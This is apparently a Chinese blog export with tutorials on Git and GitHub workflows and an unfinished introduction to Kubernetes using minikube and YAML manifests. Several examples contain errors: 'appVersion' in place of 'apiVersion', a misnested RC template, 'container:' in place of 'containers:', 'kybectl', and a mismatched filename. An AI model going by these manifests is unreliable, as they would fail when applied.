<h2 id="Github-的使用"><a href="#Github-的使用" class="headerlink" title="Github 的使用"></a>Github 的使用</h2><p>之前的操作都是在本地计算机上所做的。但是我们合作开发的时候，往往需要借用Github之类的代码托管系统。Github的使用，与我们在本地使用Git类似，只是多了拉取与推送等操作。</p>
<h3 id="创建代码仓库"><a href="#创建代码仓库" class="headerlink" title="创建代码仓库"></a>创建代码仓库</h3><p>首先需要有一个Github账号，登录后点击<code>New repository</code>，输入仓库名称，配置相应设置后，点击<code>Create repository</code>即可。</p>
<p><code>.gitignore</code>文件：保存了不需要同步的文件列表。</p>
<h3 id="添加SSH"><a href="#添加SSH" class="headerlink" title="添加SSH"></a>添加SSH</h3><p>如果是初次使用Github，需要配置SSH。</p>
<p>点击<code>用户头像</code>-&gt;<code>settings</code>-<code>&gt;ssh and gpg keys</code>-&gt;<code>new ssh key</code>，在这里添加SSH标题与电脑的SSH公钥。</p>
<p>电脑的SSH公钥生成方式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh/  <span class="comment"># 如果提示`No such file or directory`，可以手动的创建一个.ssh文件夹</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@youremail.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>之后按提示输入两遍密码，这个密码可以自己设置一个。也可以什么都不写，直接两次回车键。</p>
<p>用记事本打开.ssh目录下的id_rsa.pub文件，复制里面的内容，到github添加即可。这个公钥也可以移动到其他电脑上使用，用于用户在push时登录Github账号使用，这里建议每台计算机一个公钥。</p>
<p>使用这个命令可以测试SSH是否配置正确。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>使用这两个命令填写用户的用户名和用户邮箱，这里主要是为了在commit时显示是谁提交的代码。这个配置会被保存到<code>用户目录/.gitconfig</code>文件中。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;account&quot;</span> </span><br><span class="line">git config --global user.email <span class="string">&quot;your_email@youremail.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>后面的Push操作中，还会需要输入一次Github账号密码，这个账号密码与上面的邮箱和账号并不冲突，这个信息只会显示在commit记录上，而Push时输入的账号密码则是用来保证用户访问Github使用的。如果要修改本机上用于Push代码的Github账号密码，可到<code>控制面板</code>-&gt;<code>用户账户</code>-&gt;<code>管理Windows凭据</code>-&gt;<code>普通凭据</code>-&gt;<code>git:https://user_name@github.com</code>下修改。</p>
<h3 id="Clone-代码"><a href="#Clone-代码" class="headerlink" title="Clone 代码"></a>Clone 代码</h3><p>我们先找到放置项目的目录，使用clone命令将项目克隆到本地。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:user_name/repo_name</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/user_name/repo_name</span><br></pre></td></tr></table></figure>

<p>如果在克隆的过程中出现错误，可以使用如下命令修复。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(ssh-agent -s)</span>&quot;</span></span><br><span class="line">ssh-add</span><br></pre></td></tr></table></figure>

<h3 id="Push-代码"><a href="#Push-代码" class="headerlink" title="Push 代码"></a>Push 代码</h3><p>当代码克隆下来后，首先创建一个自己的分支进行开发。开发完成后，再提交到本地代码库。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;...&quot;</span></span><br></pre></td></tr></table></figure>

<p>积累到一定的开发量，如果要推送到远程服务器，则使用如下命令进行远程推送。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git push origin dev</span><br></pre></td></tr></table></figure>

<p>其中origin是远程分支（这个名字固定），dev为本地的分支（这个名字随便起）。执行完毕后，远程仓库将创建dev分支。</p>
<p>首次Push时，可能会提示填写Github账号与密码。</p>
<p>如果本地仓库和远程仓库都有代码，且不是一套代码，这里可以使用强推操作。这样的强制操作应该尽量慎重使用。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure>

<p>也可以先将远程仓库代码与本地代码合并再推送。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git merge</span><br></pre></td></tr></table></figure>

<h3 id="跟踪远程分支"><a href="#跟踪远程分支" class="headerlink" title="跟踪远程分支"></a>跟踪远程分支</h3><p>将本地分支跟踪服务器分支。跟踪后，Git将智能提示用户当前分支与服务器分支的进度差别。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch --set-upstream-to=origin/远程分支名称 本地分支名称</span><br></pre></td></tr></table></figure>
<p>跟踪后，可以直接使用如下代码推送代码。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>

<h3 id="拉去远程分支"><a href="#拉去远程分支" class="headerlink" title="拉去远程分支"></a>拉去远程分支</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git pull origin 远程分支名</span><br></pre></td></tr></table></figure>
<p>拉去后，分支会默认进行跟踪。</p>
<h3 id="管理远程分支-Remote-命令"><a href="#管理远程分支-Remote-命令" class="headerlink" title="管理远程分支 Remote 命令"></a>管理远程分支 Remote 命令</h3><p>查看远程已存在的分支：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote </span><br></pre></td></tr></table></figure>

<p>添加远程仓库，将远程仓库绑定到origin上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote add origin 远程仓库</span><br></pre></td></tr></table></figure>

<p>查看远程仓库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<p>可以删除远程主机：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> 主机名</span><br></pre></td></tr></table></figure>

<p>可以修改主机名：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote rename 原主机名 新主机名</span><br></pre></td></tr></table></figure>

<h2 id="工作中使用Git"><a href="#工作中使用Git" class="headerlink" title="工作中使用Git"></a>工作中使用Git</h2><ol>
<li>项目经理搭建项目框架，并放入代码管理工具。</li>
<li>普通员工在自己电脑上生成SSH公钥，交给项目经理。项目经理将SSH公钥上传至服务器。</li>
<li>项目经理给组员分发代码的克隆地址。组员将代码克隆到自己的电脑上。</li>
<li>普通员工创建自己的分支，在分支中进行每天的开发。</li>
<li>注意Master分支要保持发布的代码，Dev分支用于保存开发中的代码。</li>
<li>组员要把自己的Dev分支发布到远程Dev分支当中，但是发布之前需要确认代码可用，需要经过经理确认。</li>
</ol>
<h2 id="VS-Code-GIT"><a href="#VS-Code-GIT" class="headerlink" title="VS Code GIT"></a>VS Code GIT</h2><p>在VS Code中可以看到如下图标，这个图标就是VS Code的Git可视化管理工具。</p>
<img src="/2020/01/17/%E8%BF%90%E7%BB%B4/Git/git_vscode_icon.jpg" class="" title="Git图标">

<p>点击该按钮（源代码管理），点击<code>+</code>，选择当前文件夹，初始化Git本地仓库。这时，Git本地仓库就建立好了。</p>
<p>修改文件夹中的文件，再切换到源代码管理中，将鼠标移动到被修改的文件，可以看到右侧出现了<code>+</code>，点击<code>+</code>可以将操作暂存到暂存区。如果想取消暂存，可以再点<code>-</code>即可。如果选中了某个文件，可以在右侧预览该文件与工作区文件的区别。</p>
<p>最上方有一个<code>√</code>，这个是提交按钮，点击<code>√</code>后即可提交该版本到版本控制中。</p>
<p>如果想回退到某版本，还是需要借助命令行来实现。这里可以使用插件<code>Git History</code>查看某个版本，复制其ID，方便在命令行操作。</p>
<p>如果想添加远程仓库，也需要借助命令行。可以先执行初始化本地仓库操作，在本地版本库还是空的时候去pull远程代码。也可以跳过初始化操作，直接克隆远程代码。如果在本地版本库不是空的时候直接去pull代码，会出现下面的错误。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">fatal: refusing to merge unrelated histories</span><br></pre></td></tr></table></figure>

<p>这时可以使用下面的命令强行拉取，这样Git就会不论之前的版本库是否一致，都会去拉去远程分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git pull https://github.com/用户名/仓库名.git master --allow-unrelated-histories</span><br></pre></td></tr></table></figure>

<h2 id="Visual-Studio-2017（待更新）"><a href="#Visual-Studio-2017（待更新）" class="headerlink" title="Visual Studio 2017（待更新）"></a>Visual Studio 2017（待更新）</h2><h2 id="PyCharm-GIT（待更新）"><a href="#PyCharm-GIT（待更新）" class="headerlink" title="PyCharm GIT（待更新）"></a>PyCharm GIT（待更新）</h2><p>创建本地Git仓库。<br><code>VCS</code>-&gt;<code>VCS Operation Popup</code>-&gt;<code>Create Git Repositry</code></p>
<p>再次点击VCS，会与之前有所区别。左侧的文件菜单，文件名也会有颜色的变换。</p>
<p>右键左侧某文件或文件夹-&gt;<code>Git</code>-&gt;<code>Add</code>，将选中文件添加到版本控制中；或者在提交的时候，可以在上方的文件管理器中勾选。</p>
<p>查看版本历史<br><code>VCS</code>-&gt;<code>Browse VCS Repository</code>-&gt;<code>Show Git Repository Log</code></p>
<p>如果想回退到某一个版本，可以右键一个版本，选择<code>Checkout Revision</code>。</p>
<p>如果想切换分支<code>VCS</code>-&gt;<code>Git</code>-&gt;<code>Branches</code></p>
<h3 id="使用远程仓库"><a href="#使用远程仓库" class="headerlink" title="使用远程仓库"></a>使用远程仓库</h3><p>添加远程仓库：<br><code>VCS</code>-&gt;<code>Checkout from Version Control</code></p>
<p>填写远程仓库地址与本地目录：<br><code>https://github.com/用户名/仓库名.git </code></p>
<p>会有提示：<br><code>Would you like to open ...</code><br>这样就可以打开下载的代码了。</p>
<p>右键左侧某文件或文件夹-&gt;<code>Git</code>-&gt;<code>Repository</code>-&gt;<code>Push</code>推送代码到远程仓库。</p>
<h3 id="PyCharm-其他技巧"><a href="#PyCharm-其他技巧" class="headerlink" title="PyCharm 其他技巧"></a>PyCharm 其他技巧</h3><p>PyCharm中没有暂存库的概念，因此代码修改编辑后直接提交即可。</p>
<p><code>VCS</code>-&gt;<code>Git</code>-&gt;<code>Annotate</code> 可以看到每一行代码的作者和日期。</p>
<p>自带版本控制<code>VCS</code>-&gt;<code>Local History</code>，可以查看本地代码版本。在这里可以直接切换代码版本。</p>
<h4 id="使用Github"><a href="#使用Github" class="headerlink" title="使用Github"></a>使用Github</h4><p>配置Git：<code>File</code> -&gt; <code>Settings</code> -&gt; <code>Version Control</code> -&gt; <code>Git</code><br>配置Github账号：<code>Version Control</code> -&gt; <code>Github</code></p>
<p>创建仓库：<code>VCS</code> -&gt; <code>Import into Version Control</code> -&gt; <code>Share Project on Github</code>，填写仓库名称和信息，完成后点share。之后选择要提交的文件。</p>
<p>更新仓库：右键项目 -&gt; Git -&gt; Commit Directory -&gt; Commit</p>
<p>代码回滚：在左下角的Version Control中可以看到提交记录。右键项目 -&gt; <code>Local History</code> -&gt; <code>Show History</code> -&gt; 某一版本右键 -&gt; <code>Revert</code></p>
<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><ol>
<li>Git 版本管理<br>链接：<a href="https://pan.baidu.com/s/1ua94DTk1MkUBlILNDN7LHQ">https://pan.baidu.com/s/1ua94DTk1MkUBlILNDN7LHQ</a><br>提取码：m4un </li>
<li>Git 练习网：<a href="https://learngitbranching.js.org/">https://learngitbranching.js.org/</a></li>
<li>Git 练习网 Github：<a href="https://github.com/pcottle/learnGitBranching">https://github.com/pcottle/learnGitBranching</a></li>
</ol>
<h1 id="Git-使用"><a href="#Git-使用" class="headerlink" title="Git 使用"></a>Git 使用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加到暂存区</span></span><br><span class="line">git add files</span><br><span class="line"><span class="comment"># 提交到工作区</span></span><br><span class="line">git commit </span><br><span class="line"><span class="comment"># 推送到远程</span></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从远程拉去</span></span><br><span class="line">git pull</span><br><span class="line"><span class="comment"># 从工作区恢复版本</span></span><br><span class="line">git reset</span><br><span class="line"><span class="comment"># 从缓存区取出</span></span><br><span class="line">git checkout</span><br></pre></td></tr></table></figure>


<p>暂存区：本质是一个文件，保存即将提交的文件列表信息。</p>
<p>仓库区：HEAD文件，保存当前指向的分支；index实际存储内容。</p>
<p>分支操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch  <span class="comment"># 所有分支</span></span><br><span class="line">git branch -r <span class="comment"># 远程分支</span></span><br><span class="line">git branch -d <span class="comment"># 删除分支</span></span><br><span class="line">git branch name <span class="comment"># 创建分支</span></span><br><span class="line">git checkout -b name <span class="comment"># 创建并切换</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fetch 会从远程仓库取新的提交，但是不会修改本地的文件。</span></span><br><span class="line">git fetch </span><br><span class="line"><span class="comment"># pull 会从远程仓库取内容，并将当前分支合并到最新的提交上。</span></span><br><span class="line"><span class="comment"># pull = fetch + merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>K8S</title>
    <url>/2021/09/05/%E8%BF%90%E7%BB%B4/K8S/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>





<h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1><p>参考：<a href="https://feisky.gitbooks.io/kubernetes/content/">序言 · Kubernetes指南 (gitbooks.io)</a></p>
<p>Kubernetes，简称k8s，也是容器编排工具，功能上与Swarm相同。在前期时，Docker一直以Swarm为主，后面将逐步过渡至k8s上。</p>
<p>Kubernetes由谷歌制作，因此国内可能会无法访问。</p>
<p><a href="https://github.com/kelseyhightower">Kubernetes的重要人物</a>，通过该页面可以查看一些关于Kubernetes的介绍。</p>
<p><a href="https://labs.play-with-k8s.com/">Kubernetes Playground</a>，通过该页面可以不安装Kubernetes就可以使用。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><img src="/2021/09/05/%E8%BF%90%E7%BB%B4/K8S/k8s_struct.jpg" class="" title="Kubernetes 架构">

<p>Kubernetes也分为两种角色：Master节点与Node节点。</p>
<img src="/2021/09/05/%E8%BF%90%E7%BB%B4/K8S/k8s_master.jpg" class="" title="Kubernetes Master">

<p>Master主要包含：</p>
<ul>
<li>API Server：是外界访问集群的接口；</li>
<li>Scheduler：是均衡调度容器的模块；</li>
<li>Controller：控制容器的伸缩；</li>
<li>etcd：分布式存储。</li>
</ul>
<img src="/2021/09/05/%E8%BF%90%E7%BB%B4/K8S/k8s_node.jpg" class="" title="Kubernetes Node">

<p>Node主要包含：</p>
<ul>
<li>Pod：是调度的最基本单位，是具有相同（network） namespace的容器的组合。</li>
<li>Docker：也可以使用其他容器技术，这里使用Docker。</li>
<li>kubelet：是Master控制节点的接口，负责管理Pod。</li>
<li>kube-proxy：负责负载均衡，端口转发等功能。</li>
<li>Fluentd：查询与采集日志。</li>
<li>Optional Add-ons: DNS, UI, etc.</li>
</ul>
<p>另外还有Image Registry负责保存Image。</p>
<h2 id="创建单节点Kubernetes集群"><a href="#创建单节点Kubernetes集群" class="headerlink" title="创建单节点Kubernetes集群"></a>创建单节点Kubernetes集群</h2><p>Minikube：<br><a href="https://minikube.sigs.k8s.io/docs/start/">安装教程</a><br><a href="https://minikube.sigs.k8s.io/docs/">使用教程</a><br><a href="https://minikube.sigs.k8s.io/docs/examples/">示例</a></p>
<p>其他参考：<br><a href="https://help.ubuntu.com/community/KVM/Installation">Ubuntu 安装 KVM</a><br><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">安装kubectl工具</a></p>
<p>以下过程为基于Ubuntu的，其他系统自行参考。</p>
<p>首先安装kubectl工具：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载kubectl工具</span></span><br><span class="line">curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改为可执行文件</span></span><br><span class="line"><span class="built_in">chmod</span> +x ./kubectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件放置到环境变量bin中</span></span><br><span class="line">sudo <span class="built_in">mv</span> ./kubectl /usr/local/bin/kubectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看版本信息</span></span><br><span class="line">kubectl version --client</span><br></pre></td></tr></table></figure>

<p>可以使用Minikube创建单节点Kubernetes集群。首先安装Minikube（Ubuntu）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载安装Minikube</span></span><br><span class="line">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \</span><br><span class="line">   &amp;&amp; sudo install minikube-linux-amd64 /usr/local/bin/minikube</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否支持虚拟化</span></span><br><span class="line">egrep -q <span class="string">&#x27;vmx|svm&#x27;</span> /proc/cpuinfo &amp;&amp; <span class="built_in">echo</span> <span class="built_in">yes</span> || <span class="built_in">echo</span> no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用VirtualBox作为驱动启动集群</span></span><br><span class="line">minikube start --vm-driver=virtualbox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置VirtualBox为默认驱动</span></span><br><span class="line">minikube config <span class="built_in">set</span> vm-driver virtualbox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用KVM作为驱动启动集群</span></span><br><span class="line">minikube start --vm-driver=kvm2</span><br></pre></td></tr></table></figure>

<p>下面开始创建单节点集群：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建集群</span></span><br><span class="line">minikube start</span><br><span class="line"><span class="comment"># 查看集群配置</span></span><br><span class="line">kubectl config view</span><br><span class="line"><span class="comment"># 查看context，每一个context表示一种配置</span></span><br><span class="line">kubectl config get-contexts</span><br><span class="line"><span class="comment"># 配置minikube</span></span><br><span class="line">kubectl config use-context minikube</span><br><span class="line"><span class="comment"># 查看集群情况</span></span><br><span class="line">kubectl cluster-info</span><br><span class="line"><span class="comment"># 登录虚拟机</span></span><br><span class="line">minikube ssh</span><br></pre></td></tr></table></figure>

<h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Pod是调度的最基本单位，一个Pod拥有一个IP，并且可以包含Volume，Container等，它们之间可以通过localhost相互访问，就像是一台机器上的两个进程相互访问。</p>
<p>这里创建一个pod_nginx.yml脚本：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">ports:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>下面是一些常用命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建这个Pod：</span></span><br><span class="line">kubectl create -f pod_nginx.yml</span><br><span class="line"><span class="comment"># 删除Pod：</span></span><br><span class="line">kubectl delete -f pod_nginx.yml</span><br><span class="line"><span class="comment"># 查看部署的Pod：</span></span><br><span class="line"><span class="comment"># -o wide 可以显示详细信息</span></span><br><span class="line">kubectl get pods -o wide</span><br><span class="line"><span class="comment"># 进入第一个Pod，-c表示第几个，不加表示默认的第一个</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -it nginx -c 1 sh</span><br><span class="line"><span class="comment"># 查看Pod的详细信息</span></span><br><span class="line">kubectl describe pods nginx</span><br><span class="line"><span class="comment"># 映射集群端口到本地，格式  本地端口:集群端口</span></span><br><span class="line">kubectl port-forward nginx 8080:80</span><br></pre></td></tr></table></figure>

<h2 id="Replicate"><a href="#Replicate" class="headerlink" title="Replicate"></a>Replicate</h2><p>首先创建一个文件<code>rs_nginx.yml</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">appVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="comment"># 如果是高版本，可以用ReplicaSet</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">spec:</span></span><br><span class="line">        <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">            <span class="attr">ports:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>创建Replicate并可以做如下实验：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建Replicate</span></span><br><span class="line">kubectl create -f rs_nginx.yml</span><br><span class="line"><span class="comment"># 查看Replicate</span></span><br><span class="line">kubectl get rc</span><br><span class="line"><span class="comment"># 查看内部的Pod</span></span><br><span class="line">kubectl get pods</span><br><span class="line"><span class="comment"># 删除单个Pod，pod_name可以用get pods查看</span></span><br><span class="line">kubectl delete pods pod_name</span><br><span class="line"><span class="comment"># 删除后会发现会有新的Pod被创建</span></span><br></pre></td></tr></table></figure>

<p>如果要扩展Pod数量（或收缩Pod数量）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl scale rc nginx --replicas=4</span><br></pre></td></tr></table></figure>

<p>最后删除Replicate：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl delete -f rc_nginx.yml</span><br></pre></td></tr></table></figure>

<p>关于ReplicaSet，可以参考如下文档：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicaSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">frontend</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span> </span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">tier:</span> <span class="string">frontend</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">tier:</span> <span class="string">frontend</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>扩展的时候使用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl scale rs nginx --replicas=4</span><br></pre></td></tr></table></figure>

<h2 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h2><p>Deployment指明了我们期望创建的集群，以及相应容器的版本，而其他内容则全部交给Kubernetes来实现。使用Deployment可以实现版本升级。</p>
<p>首先创建<code>deployment_nginx</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">appVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">container:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">nginx:1.12.2</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建</span></span><br><span class="line">kubectl create -f deployment_nginx.yml</span><br><span class="line"><span class="comment"># 查看deployment，-o wide表示更多信息</span></span><br><span class="line">kubectl get deployment -o wide</span><br><span class="line"><span class="comment"># 查看ReplicaSet</span></span><br><span class="line">kubectl get rs</span><br><span class="line"><span class="comment"># 查看Pods</span></span><br><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>

<p>更新升级Deployment：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">set</span> image deployment nginx-deployment nginx=nginx:1.13</span><br><span class="line"><span class="comment"># 再次查看deployment，可以发现nginx已经更新</span></span><br><span class="line">kubectl get deployment -o wide</span><br><span class="line"><span class="comment"># 查看更新日志</span></span><br><span class="line">kubectl rollout <span class="built_in">history</span> deployment nginx-deployment</span><br></pre></td></tr></table></figure>

<p>撤销更新</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment nginx-deployment</span><br></pre></td></tr></table></figure>

<h2 id="创建多节点Kubernetes集群"><a href="#创建多节点Kubernetes集群" class="headerlink" title="创建多节点Kubernetes集群"></a>创建多节点Kubernetes集群</h2><p>创建多节点Kubernetes集群，可以使用kubeadm，kops或是Tectonic（10 Nodes以内免费）。这里使用Tectonic（基于Vagrant）。</p>
<p><a href="https://coreos.com/tectonic">Tectonic官网</a><br><a href="https://github.com/AlexxNica/tectonic-sandbox">Tectonic Sandbox Github页 非官方</a></p>
<p>安装好Tectonic后，配置Tectonic与minikube并存可以到kubernetes官网查看<code>Configure Access to Multiple Clusters</code>。</p>
<p>查看Node：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl get node</span><br></pre></td></tr></table></figure>

<p>可以看到刚刚创建的两个Node，即两个虚拟机。</p>
<p>集群使用的<a href="https://kubernetes.lo/docs/concepts/cluster-administration/networking/">网络插件</a>可以在此页查看。</p>
<h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service主要有三种类型：</p>
<ul>
<li>ClusterIP：只有集群内部可以访问的IP。 </li>
<li>NodePort：可以对外提供访问。</li>
<li>LoadBalancer：由服务商（阿里云，腾讯云）提供，可以让我们将服务交给服务商管理。</li>
</ul>
<h3 id="ClusterIP"><a href="#ClusterIP" class="headerlink" title="ClusterIP"></a>ClusterIP</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对外暴露Pod端口，默认是ClusterIP</span></span><br><span class="line">kybectl expose pods nginx-pod</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">kybectl get svc</span><br><span class="line"><span class="comment"># 这样可以在集群内部访问Pod提供的服务</span></span><br></pre></td></tr></table></figure>

<p>创建文件<code>deployment_python_http.yml</code>：</p>
